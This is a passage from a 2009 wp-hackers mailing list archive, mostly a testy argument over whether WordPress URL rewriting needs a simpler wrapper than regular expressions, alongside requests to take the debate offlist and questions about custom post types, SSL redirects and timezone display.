	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com> 
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com> 
	<81d01c0912031118v3fca59eeh27447870f8de8bab@mail.gmail.com>
Message-ID: <161617690912031339o2ad5c25enfb96728401c0e62b@mail.gmail.com>

On Thu, Dec 3, 2009 at 1:18 PM, Christopher O'Connell
<jwriteclub at gmail.com> wrote:
> Your argument just doesn't make sense. By your logic, we shoudn't abstract
> away SQL, because "if a person is not capable of understanding SQL, and
> can't look in a book for 10 minutes to figure out what they want to do, then
> they should not be writing code of any kind. They should stick to something
> simple, like flipping burgers."

Actually, SQL was and is designed to be used by end-users directly for
gathering data and reporting and such. In other words, in a properly
designed system, yes, the end-user (business user) does have direct
access to the database and can run arbitrary SQL commands. The
database might not give him permission to UPDATE or DELETE or what
have you, but a database is explicitly designed to be a multi-user
environment like that.

Let me rephrase that: SQL is designed to be used by *business people*.
Not programmers.

The only real reason we abstract it out is because we have only a
small subset of SQL queries that are needed for the application at
hand.

> The reason we abstract stuff away is to simplify programming. It's a common
> use case to redirect a URL to a controller (and that's what it is, no matter
> what you want to call it). It should therefore be simple. I don't know how
> they do things in the South, but out west a couple of dozen lines of code
> including RegEx is NOT SIMPLE! Indeed, it's so not simple, that it's broken.

I don't know exactly what you mean by "controller", but let's assume
you're talking about the bit that chooses your "view" (template from
the theme in this case).

The example I gave before was about 8-10 lines of consequence. That
was to redirect "/products/whatever" to a whatever.php template. If
you wanted to also add, say, /reviews/whatever to that code, it would
take 3-4 extra lines (depending on your coding style).

You're looking at this from the point of view of "redirecting a URL to
a template". But I'm looking at this from the point of view of what
you *actually* want to do, which is to parse the URL and then
determine and load the right template. These are actually equivalent,
but for some reason, you are not seeing that fact.

Let's say I wrote you a new function, called redirect_URL_to_template.
It'd work like this:
redirect_URL_to_template('products');

What would it do? Well, it would redirect /products/whatever to
products/whatever.php in your theme, for any given value of whatever.
You could call it over and over and add as much as you wanted.

Then you come to me and say "Why can't I redirect /reviews/something
to /notreviews/something.php?" And I tell you, well, because the
function doesn't work that way. And you tell me "Well make it work
that way". So now the wrapper function becomes more complex. And then
somebody else wants it slightly different.

Pretty soon you have either dozens of wrapper functions, each very
similar but doing different things, or your wrapper function is so
complex that nobody can figure out how to use it.

Or, I could teach you "this is how the system works, it's pretty
simple but you do have to think a small amount, however it's powerful
enough to let you make any arbitrary URL do any damn thing you like,
whether it be routing to views, or calling functions, or even
downloading the complete works of shakespeare.. You can do anything
with it, and all you have to learn is this extremely tiny subset of
regular expressions. And by extremely tiny, I only mean what these
characters do: .*?+[]()$     Seriously, that's probably all you ever
need.

What makes more sense?

> P.S. Brewing beer, is, IMHO much simpler than RegEx

As a homebrewer and programmer, I find that highly offensive. Brewing
is a far, far more complicated process. If you're doing it right, I
mean. Any old idiot can throw a prehopped malt in and do a boil, I
grant you, but if you really care about your beer, it takes more
effort than that.

> P.P.S. This reminds me of the discussions on some of the linux boards about
> how "including a graphical package manager is totally unneccessary, because
> there's a command line one".

Funnily enough, on my Fedora install, I'm always popping up a command
line to run yum, because PackageKit sucks and is hard to use.

-Otto

From otto at ottodestruct.com  Thu Dec  3 22:03:31 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 16:03:31 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <B3BC1158-BCF5-4AAB-85A7-F663574148C3@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com> 
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com> 
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com> 
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
	<161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com> 
	<828D7201-5A95-41F5-B954-E10F6884D5DC@newclarity.net>
	<161617690912031026y663467a4m579fc6e56036a818@mail.gmail.com> 
	<B3BC1158-BCF5-4AAB-85A7-F663574148C3@newclarity.net>
Message-ID: <161617690912031403g2347ab8aib9c8f588050c963b@mail.gmail.com>

On Thu, Dec 3, 2009 at 1:21 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> BTW, it reminds me of the Army Corp of Engineers in North Georgia. It's run by a group of fishermen. ?Their opinion of Lake Lanier is it is "a fishing lake" though it is far more popular for recreational use. Thus, even though the vast majority of users are recreational the Corp blocks every attempt to make the lake safer for recreation because the changes affect it's use as a fishing lake. ?What they *could* do is make the 20% of the lake that is popular for recreation safer for recreation and leave the remaining 80% good for fishing, but they won't even consider that approach.

Yeah, well you know what? The fishermen are right. The recreational
users should just suck it up and go elsewhere. IMO, of course.

> My opinion is that they are not using custom post types yet because they are not yet available in the release version. ?Wait a while and I believe that will change. ?But it is my opinion so we can only wait to see if I am right or not.

So, you're basing your idea of the "most common use case" on what
"most people want" even though it has not been released yet, so they
can't actually *do* that at this point in time? LOL.

>> The most common case I've seen for plugins to use it is to create
>> their own subset of pages to display whatever. Like an image gallery,
>> for example. It takes over the /gallery/* set of pages, redirects to
>> itself, and does whatever it likes.
>
> Or, custom post types by another name...

No...As in redirecting to the plugin. You know, like what I *actually
said* instead of you pretending something else.

> Why must you be so condescending? ?It's hard not to take things personal when you describe my writings in those terms.

If your writing was clearer, maybe I wouldn't have to use those terms.

> You would never do 20000 custom urls, you'd only do one custom url for all products. ?But let's say you wanted to have a custom URL that lists recent products, and you want the "recent" slug to be used like the "acme-widgets" slug; you would add two custom URL templates:
>
> /products/recent/ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? <-- this is more specific and would match first
> /products/{product_slug}/

I don't understand what you mean by {product_slug}. That's not any
form of URL matching scheme I've ever seen. It looks totally
nonstandard to me. What does {product_slug} match against? Any string?
With or without backslashes? Numeric? Alpha?

Your descriptions leave much to be desired, I can't decode them based
on nothingness.

If you meant that it's an arbitrary string, no backslash, then I gave
you just the way to do it earlier. With actual code instead of vague
descriptions.

> You are conflating the two. What's more what you propose is bad REST, HTTP and URL design. ?You should issue a 404 error, not redirect to the general purpose.

Who are you to say what I should or should not do? What I did has
nothing to do with REST or HTTP, and that is in fact the way the
WordPress Template Hierarchy works. I suggest you look it up:
http://codex.wordpress.org/Template_Hierarchy

> The word "easy" and that code are oxymorons.

I find that code to be trivially easy, and I think that any human
being is capable of understanding it with a minimal amount of effort.

And I find your continued interjection of your opinion as if it was a
fact to be insulting.

> Ironic, you are treating your own opinions as truth handed down from up on high; why shouldn't I?

I'm providing actual code, actual examples, and actual explanations.
All you are providing is negative feedback, continued insults, and
unprovable untested opinions as facts.

> Better yet, maybe we are getting somewhere. How about we agree on this list that both of our opinions are just that, and not the final word on anything. ?Deal?

I don't believe you're capable of sticking to such a deal at this
point. I have not one time treated my opinion as if it were a fact,
and I'm getting more and more annoyed at you for refusing to answer
any of my points with any commentary of substance

> It's foolish for you to say false here. ?If the layer doesn't execute it doesn't make things slower.

If the layer doesn't execute, then it can't do anything and nothing
happens. Hey, maybe if I don't include files, then they won't slow
anything down either! I'm sorry, but this is a stupid argument. The
layer executing is the only case that matters.

> Adding a hook makes things slower. Does that stop the core team from adding new hooks each version? ?Premature optimization is a fools errand.

I agree that premature optimization is a bad idea. However, I disagree
that NO optimization is the inverse of that idea.

Your layer will be slower than doing the same thing *without* the
layer. In other words, if I take all the code I gave before, rewrite
it slightly to be generic from function arguments, wrap it into a
function, then call the function... That is *slower*.

> That's answering out of context. ?I'm asking how many people are doing URL rewriting where they had to write the code you are promoting? ?Very few.

What? It would be all of them, because the code I'm giving you *is how
you do URL rewriting*.

And again, I don't understand you. Are you asking how many people add
URL rewriting to their own site by coding it themselves? I'd say
virtually none, but then again, how many people write their own theme?
The question makes no sense and seems somewhat pointless to begin
with.

> What I'd prefer to do is search the theme repo for it. ?Again, plugins are not my use case, themes are.

I fail to understand why you keep pushing this to themes. It makes
little sense to me, as a theme would not be the primary use case for
URL rewriting in the first place. The end user is the one who wants to
change his URLs around. And he's probably going to look for plugins to
do it. Themes are visual only, generally speaking. Display candy.
Graphics and CSS. They're not the primary places to put code.

-Otto
Sent from Memphis, TN, United States

From mikeschinkel at newclarity.net  Thu Dec  3 22:18:04 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 17:18:04 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912031339o2ad5c25enfb96728401c0e62b@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
	<81d01c0912031118v3fca59eeh27447870f8de8bab@mail.gmail.com>
	<161617690912031339o2ad5c25enfb96728401c0e62b@mail.gmail.com>
Message-ID: <09E60DB7-814A-4122-901D-0E153D2EB40C@newclarity.net>

On Dec 3, 2009, at 4:39 PM, Otto wrote:
> On Thu, Dec 3, 2009 at 1:18 PM, Christopher O'Connell
> <jwriteclub at gmail.com> wrote:
>> Your argument just doesn't make sense. By your logic, we shoudn't abstract
>> away SQL, because "if a person is not capable of understanding SQL, and
>> can't look in a book for 10 minutes to figure out what they want to do, then
>> they should not be writing code of any kind. They should stick to something
>> simple, like flipping burgers."
> 
> Actually, SQL was and is designed to be used by end-users directly for
> gathering data and reporting and such. In other words, in a properly
> designed system, yes, the end-user (business user) does have direct
> access to the database and can run arbitrary SQL commands. The
> database might not give him permission to UPDATE or DELETE or what
> have you, but a database is explicitly designed to be a multi-user
> environment like that.
> 
> Let me rephrase that: SQL is designed to be used by *business people*.
> Not programmers.

There you go again with your opinions as if they were "decried from on high."  

In my experience, most "business people" will do whatever they can not to have to learn SQL.  A graphical query tool, yes, but not a text-based query language.

Yes, it's my opinion but as such it is as equally valid as yours.

> The only real reason we abstract it out is because we have only a
> small subset of SQL queries that are needed for the application at
> hand.

Only reason?  (You can't prove a negative.)

Well, having a small subset is the same that can be said for URL Rewriting.

>> The reason we abstract stuff away is to simplify programming. It's a common
>> use case to redirect a URL to a controller (and that's what it is, no matter
>> what you want to call it). It should therefore be simple. I don't know how
>> they do things in the South, but out west a couple of dozen lines of code
>> including RegEx is NOT SIMPLE! Indeed, it's so not simple, that it's broken.
> 
> I don't know exactly what you mean by "controller", but let's assume
> you're talking about the bit that chooses your "view" (template from
> the theme in this case).
> 
> The example I gave before was about 8-10 lines of consequence. That
> was to redirect "/products/whatever" to a whatever.php template. If
> you wanted to also add, say, /reviews/whatever to that code, it would
> take 3-4 extra lines (depending on your coding style).
> 
> You're looking at this from the point of view of "redirecting a URL to
> a template". But I'm looking at this from the point of view of what
> you *actually* want to do, which is to parse the URL and then
> determine and load the right template. These are actually equivalent,
> but for some reason, you are not seeing that fact.
> 
> Let's say I wrote you a new function, called redirect_URL_to_template.
> It'd work like this:
> redirect_URL_to_template('products');
> 
> What would it do? Well, it would redirect /products/whatever to
> products/whatever.php in your theme, for any given value of whatever.
> You could call it over and over and add as much as you wanted.
> 
> Then you come to me and say "Why can't I redirect /reviews/something
> to /notreviews/something.php?" And I tell you, well, because the
> function doesn't work that way. And you tell me "Well make it work
> that way". So now the wrapper function becomes more complex. And then
> somebody else wants it slightly different.
> 
> Pretty soon you have either dozens of wrapper functions, each very
> similar but doing different things, or your wrapper function is so
> complex that nobody can figure out how to use it.

If there were not a small set of patterns for URL rewriting, your argument would make sense. As is, it does not.

Besides, your small argument could be applied fallaciously to practically anything of complexity, i.e. the admin menu functions. It doesn't apply there any more than it applies here.

> Or, I could teach you "this is how the system works, it's pretty
> simple but you do have to think a small amount, however it's powerful
> enough to let you make any arbitrary URL do any damn thing you like,
> whether it be routing to views, or calling functions, or even
> downloading the complete works of shakespeare.. You can do anything
> with it, and all you have to learn is this extremely tiny subset of
> regular expressions. And by extremely tiny, I only mean what these
> characters do: .*?+[]()$     Seriously, that's probably all you ever
> need.
> 
> What makes more sense?

Simplification that removes the black art of regular expressions from the URL rewriting interface that most people will use makes the most sense.

>> P.S. Brewing beer, is, IMHO much simpler than RegEx
> 
> As a homebrewer and programmer, I find that highly offensive.
> Brewing is a far, far more complicated process. If you're doing it right, I
> mean. Any old idiot can throw a prehopped malt in and do a boil, I
> grant you, but if you really care about your beer, it takes more
> effort than that.


Offensive?  

As you've told me, don't take things so personally. ;-)

>> P.P.S. This reminds me of the discussions on some of the linux boards about
>> how "including a graphical package manager is totally unneccessary, because
>> there's a command line one".
> 
> Funnily enough, on my Fedora install, I'm always popping up a command
> line to run yum, because PackageKit sucks and is hard to use.

And some people are only able to see things from their own perspective. So there you go. 

Oops, I thought I was done with this.  There I go again.

-Mike


From otto at ottodestruct.com  Thu Dec  3 22:27:30 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 16:27:30 -0600
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <09E60DB7-814A-4122-901D-0E153D2EB40C@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net> 
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com> 
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com> 
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com> 
	<81d01c0912031118v3fca59eeh27447870f8de8bab@mail.gmail.com> 
	<161617690912031339o2ad5c25enfb96728401c0e62b@mail.gmail.com> 
	<09E60DB7-814A-4122-901D-0E153D2EB40C@newclarity.net>
Message-ID: <161617690912031427h5bb64162tce8281eee47ef77f@mail.gmail.com>

On Thu, Dec 3, 2009 at 4:18 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
>> Let me rephrase that: SQL is designed to be used by *business people*.
>> Not programmers.
>
> There you go again with your opinions as if they were "decried from on high."

a) That is not an opinion. It is historical fact. Look it up.
b) Please, try to read my actual words before judging them.

> In my experience, most "business people" will do whatever they can not to have to learn SQL. ?A graphical query tool, yes, but not a text-based query language.

I never said that business people *liked* it.
I never said that it was even a good idea, or that it worked out.

Please, try to read my words and understand their meaning before
responding. I try to choose my phrasing very, very carefully, so when
you just come along, don't actually bother reading what I type, and
then respond to something that I DID NOT SAY, then it really irks me.

> Yes, it's my opinion but as such it is as equally valid as yours.

I stated no opinions in what you responded to.

> If there were not a small set of patterns for URL rewriting, your argument would make sense. As is, it does not.

There are not a small set of patterns. You can rewrite URLs in any way
you see fit. The set is unbounded.

> Besides, your small argument could be applied fallaciously to practically anything of complexity, i.e. the admin menu functions. It doesn't apply there any more than it applies here.

You may have noticed that there's dozens of functions specifically for
screwing around with admin menus. This "wrapping" seems pretty ill
advised and hard to use to me. Check out the Settings API and the
Adding Administration Menus pages on the codex.

> Simplification that removes the black art of regular expressions from the URL rewriting interface that most people will use makes the most sense.

Black art? Are you serious? How about wildcards, are they a black art?
Because it's no more complex than that.

-Otto
Sent from Memphis, TN, United States

From jeffc at wptavern.com  Thu Dec  3 22:35:13 2009
From: jeffc at wptavern.com (Jeff Chandler)
Date: Thu, 03 Dec 2009 17:35:13 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to,
	read...)
Message-ID: <4B183D21.2050305@wptavern.com>

Can you two please take this into your personal inboxes. This is killing 
mine :) you two are the perfect storm of a never ending debate. Just 
wondering when references to Nazis will pop up.

From otto at ottodestruct.com  Thu Dec  3 22:35:38 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 16:35:38 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to,
	read...)
In-Reply-To: <4B183D21.2050305@wptavern.com>
References: <4B183D21.2050305@wptavern.com>
Message-ID: <161617690912031435t5ae84fd7i3a9d01d60534db92@mail.gmail.com>

Fine.

-Otto
Sent from Memphis, TN, United States


On Thu, Dec 3, 2009 at 4:35 PM, Jeff Chandler <jeffc at wptavern.com> wrote:
> Can you two please take this into your personal inboxes. This is killing
> mine :) you two are the perfect storm of a never ending debate. Just
> wondering when references to Nazis will pop up.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From james at om4.com.au  Thu Dec  3 22:36:24 2009
From: james at om4.com.au (James Collins)
Date: Fri, 4 Dec 2009 09:36:24 +1100
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <71ddd7490912031259p703dd9e6he8947c9c4bd78455@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<71ddd7490912031259p703dd9e6he8947c9c4bd78455@mail.gmail.com>
Message-ID: <bcf8d3150912031436t121a108dodbe99733b4047fab@mail.gmail.com>

Doug,

I suggest you check out this existing trac ticket on hierarchical custom
taxonomies: http://core.trac.wordpress.org/ticket/10122

It doesn't look like it'll make it into 2.9 though.

Regards,

James Collins

OM4 - Website Design and Development
OM4.com.au | OM4Tourism.com



2009/12/4 Doug Stewart <zamoose at gmail.com>

> My one HUGE request:
>
> * Hierarchies for custom post types/taxonomies. (Slap me if I'm mixing
> my metaphors and have the notion of custom post types all
> whopperjawed...)
>
> As of right now, if you register a custom taxonomy and want automatic
> buy-in from WP's administrative interface, you HAVE to make it a flat
> taxonomy. Hierarchical ones simply fail to register and no amount of
> prodding seems to work.
>
> I'd like to have the ability to have a single "ancestor" post with an
> arbitrary number of related child and grandchild and great-grandchild
> (et cetera) posts each with the potential to be another unique type.
>
> So, for instance, in a simplistic use case, if I were to create a
> "magazine" using WordPress, I could create "issues", each of which
> could have "articles".  In a bit more complex of a metaphor, I could
> have a daily "newspaper" with "issues", each of which had a "section"
> that then proceeded to have "articles".
>
> Am I making sense here?
>
> --
> -Doug
> @zamoose
> http://literalbarrage.org/blog/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From me at anthony.geek.nz  Thu Dec  3 22:37:21 2009
From: me at anthony.geek.nz (Anthony Cole)
Date: Fri, 4 Dec 2009 11:37:21 +1300
Subject: [wp-hackers] STFU kthxbai
Message-ID: <03005BB1-DE0E-4ACE-8914-5B3708370063@anthony.geek.nz>

I know it's kind of obvious, but, well, I can't take this anymore.

I can't read anything on this list, and I know I speak for alot of people when I say this. 

Do you guys know when to shut up? Seriousy. I've been on this list for about two days after a little hiatus. I'm not really well known, but one thing I do know is that I'm human - just like everyone here - and for my sanity and others - I'm asking for just a little bit of peace and quiet. 

I've seen people ask questions and get flooded out by people acting like five year olds. I know people who've left this list because of it. I remember how this list was a few years ago, and although it's always been a little bit controversial, can we stop acting like we're all still in primary school?

It's obvious who's causing the problems. 

And thats my two cents....

*runs from the vultures*

-ac


From mccormicky at gmail.com  Thu Dec  3 22:38:46 2009
From: mccormicky at gmail.com (mccormicky)
Date: Thu, 3 Dec 2009 17:38:46 -0500
Subject: [wp-hackers] Once in SSL state- Redirect to non-SSL?
Message-ID: <d7153760912031438u4465aaeevb4c57efd7f34619e@mail.gmail.com>

I have this issue going on with one site I'll call case study 2,  which
needs  one page secured.

 The page gets secured and this is great!  but if anyone clicks a navigation
tab/link the site remains in the secure state, all urls remain https.

I installed https for wordpress (plugin) on another website which I will
call case study 1 and secured one page.

On case study 1  if a navigation tab/link the site redirects out of https
and all urls revert back to http. This is the ideal.

Case study 1  and case study 2 both use the https for wordpress plugin. And
both have  privately signed SSL certificates for their domains.

One difference between the 2 sites is one uses godaddy(case study 1) the
other uses hostcentric.

Any ideas why the results are better for case study 1?

From wp at xentek.net  Thu Dec  3 22:41:07 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 17:41:07 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
Message-ID: <842396BA-9DE3-4692-8188-9A5551002EE4@xentek.net>

On Dec 3, 2009, at 12:56 PM, Otto wrote:

> I do like the idea of making an easy way to steal the post editor
> screen for a custom post type without reinventing the wheel. There
> should be some nice way to do that. I don't know of one at the moment,
> a lot of it seems hardcoded and hard to appropriate.


I just did this, and its not too bad. It could be a lot easier for  
sure, but once you see how it works, it was easy to create one. I've  
only begun to scratch the surface, but you can view the results in  
this plugin: http://github.com/ads/wp_post_footer/ (soon to be on the  
extend db).

What we need are more functions like the_editor() that make adding  
different parts of the screen(s) to the page, without copying a lot of  
markup.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From mikeschinkel at newclarity.net  Thu Dec  3 22:43:06 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 17:43:06 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to,
	read...)
In-Reply-To: <4B183D21.2050305@wptavern.com>
References: <4B183D21.2050305@wptavern.com>
Message-ID: <5CF1007E-0E8E-4357-AF64-E96BECD14F1E@newclarity.net>

On Dec 3, 2009, at 5:35 PM, Jeff Chandler wrote:

> Can you two please take this into your personal inboxes. This is killing mine :) you two are the perfect storm of a never ending debate. Just wondering when references to Nazis will pop up.

Certainly.  My last reply will go directly to Otto.

-Mike

From wp at xentek.net  Thu Dec  3 22:43:24 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 17:43:24 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
Message-ID: <FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>

On Dec 3, 2009, at 1:41 PM, Stephen Rider wrote:

> I think a cart/horse inversion is happening here, but something to  
> keep in mind for *after* the full Post Type API is in place.

What do you mean by the full post API? What can't you do with  
wp_insert_post, wp_update_post, wp_delete_post, get_post, get_posts,  
add_post_meta, update_post_meta, delete_post_meta, and friends?

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From otto at ottodestruct.com  Thu Dec  3 22:43:34 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 16:43:34 -0600
Subject: [wp-hackers] STFU kthxbai
In-Reply-To: <03005BB1-DE0E-4ACE-8914-5B3708370063@anthony.geek.nz>
References: <03005BB1-DE0E-4ACE-8914-5B3708370063@anthony.geek.nz>
Message-ID: <161617690912031443i802d123s2c385261b45c9979@mail.gmail.com>

Anthony,

With being on email lists comes a certain amount of volume. So, if you
don't want to receive a lot of emails via a list, then my advice is
don't get on the list.

Seriously, the fact is that email lists are intended to have
widespread conversations. People are going to post on them. That's the
whole point of having them in the first place.

Alternatively, use your email program of choice to filter list traffic
into separate folders, or to apply separate labels (Gmail is
particularly good at this), or whatever.

If all you want to do is to read on your own schedule, then there's
the archives here:
http://lists.automattic.com/mailman/listinfo/wp-hackers

There's also a mirror of the list on Google Groups:
http://groups.google.com/group/wp-hackers

If the volume is too high and you can't use filters and such, then I
highly recommend using one of those instead of subscribing.

Hope that helps!

-Otto
Sent from Memphis, TN, United States


On Thu, Dec 3, 2009 at 4:37 PM, Anthony Cole <me at anthony.geek.nz> wrote:
> I know it's kind of obvious, but, well, I can't take this anymore.
>
> I can't read anything on this list, and I know I speak for alot of people when I say this.
>
> Do you guys know when to shut up? Seriousy. I've been on this list for about two days after a little hiatus. I'm not really well known, but one thing I do know is that I'm human - just like everyone here - and for my sanity and others - I'm asking for just a little bit of peace and quiet.
>
> I've seen people ask questions and get flooded out by people acting like five year olds. I know people who've left this list because of it. I remember how this list was a few years ago, and although it's always been a little bit controversial, can we stop acting like we're all still in primary school?
>
> It's obvious who's causing the problems.
>
> And thats my two cents....
>
> *runs from the vultures*
>
> -ac
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Thu Dec  3 22:46:05 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Thu, 3 Dec 2009 22:46:05 +0000
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912031427h5bb64162tce8281eee47ef77f@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
	<81d01c0912031118v3fca59eeh27447870f8de8bab@mail.gmail.com>
	<161617690912031339o2ad5c25enfb96728401c0e62b@mail.gmail.com>
	<09E60DB7-814A-4122-901D-0E153D2EB40C@newclarity.net>
	<161617690912031427h5bb64162tce8281eee47ef77f@mail.gmail.com>
Message-ID: <1541BA27-B60C-4607-9C3A-5A1AF660B754@ftwr.co.uk>


All,

Could you please take this discussion offlist if you want to discuss  
further.

It has now strayed away from the original subject matter and it is no  
longer serving as a useful discussion for this list.

Thanks

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mikeschinkel at newclarity.net  Thu Dec  3 22:48:57 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 17:48:57 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <71ddd7490912031259p703dd9e6he8947c9c4bd78455@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<71ddd7490912031259p703dd9e6he8947c9c4bd78455@mail.gmail.com>
Message-ID: <6D8B3755-3266-4272-A186-3DC36A1E9953@newclarity.net>

On Dec 3, 2009, at 3:59 PM, Doug Stewart wrote:
> My one HUGE request:
> 
> * Hierarchies for custom post types/taxonomies. (Slap me if I'm mixing
> my metaphors and have the notion of custom post types all
> whopperjawed...)
> 
> As of right now, if you register a custom taxonomy and want automatic
> buy-in from WP's administrative interface, you HAVE to make it a flat
> taxonomy. Hierarchical ones simply fail to register and no amount of
> prodding seems to work.
> 
> I'd like to have the ability to have a single "ancestor" post with an
> arbitrary number of related child and grandchild and great-grandchild
> (et cetera) posts each with the potential to be another unique type.
> 
> So, for instance, in a simplistic use case, if I were to create a
> "magazine" using WordPress, I could create "issues", each of which
> could have "articles".  In a bit more complex of a metaphor, I could
> have a daily "newspaper" with "issues", each of which had a "section"
> that then proceeded to have "articles".
> 
> Am I making sense here?

Great use case.  Sounds like what you want could be handled a variety of ways.  One would be to use the Drupal CCK/Pods for WordPress like multiple tables, i.e.

wp_posts
wp_custom_magazines
wp_custom_issues
wp_custom_articles

So this would be a good example of where a Pods-like approach would probably work well. I think articles, newspapers and sections could probably be handled with taxonomy.

Another approach, probably the preferred in the Wordpress world would be to add custom taxonomies as a layer on top of custom post types.  There you could associate magazines and issues and articles, et. al.  With this approach the two might even be orthogonal issues, and probably will be available once custom post types roll out in 2.9 and people have a chance to apply taxonomy over custom post types.

-Mike





> 
> -- 
> -Doug
> @zamoose
> http://literalbarrage.org/blog/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at xentek.net  Thu Dec  3 22:49:46 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 17:49:46 -0500
Subject: [wp-hackers] Post Correct Timezone with DST
In-Reply-To: <9FB917B4-4F35-4AFD-91B7-2B8C2D3E5B38@jallits.com>
References: <9FB917B4-4F35-4AFD-91B7-2B8C2D3E5B38@jallits.com>
Message-ID: <F5D879B2-EE82-44FC-9813-268F2F4039DE@xentek.net>


On Nov 25, 2009, at 5:46 PM, Daniel Craig Jallits wrote:

> I want to display either Central Daylight Time (CDT) or Central  
> Standard Time (CST) as part of my post's timestamp [single.php]. I  
> have RTFM and searched the codex plus google with no positive  
> results. Can anyone point me in the right direction?

